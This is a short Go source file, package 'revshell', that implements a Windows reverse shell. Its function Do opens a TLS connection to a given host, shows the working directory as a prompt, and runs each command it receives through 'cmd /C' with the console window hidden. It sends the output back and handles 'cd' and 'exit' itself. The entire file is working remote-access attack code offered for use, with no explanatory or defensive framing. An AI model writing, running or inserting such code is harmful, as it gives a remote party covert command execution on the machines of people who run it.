package revshell

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func Do(host string, conf *tls.Config) error {
	c, err := tls.Dial("tcp", host, conf)
	if err != nil {
		return err
	}
	cwd, err := os.Getwd()
	if err != nil {
		return err
	}
	cwd = cwd + "> "
	for {
		c.Write([]byte(cwd))
		cmdstr, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			return err
		}
		tokens := strings.Fields(cmdstr)
		if tokens[0] == "cd" && len(tokens) == 2 {
			err := os.Chdir(tokens[1])
			if err != nil {
				c.Write([]byte(err.Error()))
			}
			cwd, _ = os.Getwd()
			cwd = cwd + "> "
			continue
		} else if tokens[0] == "exit" {
			return nil
		}
		cmd := exec.Command("cmd", "/C", cmdstr)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		var cerr bytes.Buffer
		cmd.Stderr = &cerr
		out, err := cmd.Output()
		if err != nil {
			if len(cerr.String()) != 0 {
				c.Write(cerr.Bytes())
			}
		}
		c.Write([]byte(out))
		c.Write([]byte("\n"))
	}
}
